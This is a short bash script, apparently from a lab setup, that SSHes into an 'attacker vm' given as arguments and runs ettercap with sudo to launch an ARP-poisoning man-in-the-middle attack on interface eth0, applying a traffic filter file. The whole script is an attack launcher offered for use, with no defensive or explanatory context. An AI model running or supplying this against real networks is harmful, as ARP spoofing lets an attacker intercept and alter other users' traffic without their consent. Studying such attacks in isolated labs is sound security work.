#!/bin/bash

if [[ -z ${1} || -z ${2} ]]; then
  echo "please provide username and ip address of the attacker vm"
  exit 1;
else
  ssh "${1}@${2}" sudo ettercap -q -T --mitm ARP -i eth0 -F /usr/share/ettercap/filter.ef
fi
